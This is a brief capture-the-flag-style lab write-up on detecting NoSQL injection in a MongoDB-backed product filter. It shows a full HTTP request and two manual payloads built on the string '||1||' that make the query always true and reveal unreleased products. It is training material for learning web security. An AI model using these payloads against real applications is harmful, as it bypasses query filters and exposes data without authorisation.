## Lab: Detecting NoSQL injection

Description:

- The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

- To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products. 

```
GET /filter?category=test'||1||' HTTP/2
Host: 0ad200a3035aa22b80e63fae0079003d.web-security-academy.net
Cookie: session=nPzb67IT7hLL2EGWRpK4rKbHmyS3zR9C
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Manual Payload:

```
test'||1||'
```

```
Gifts'||1||'
```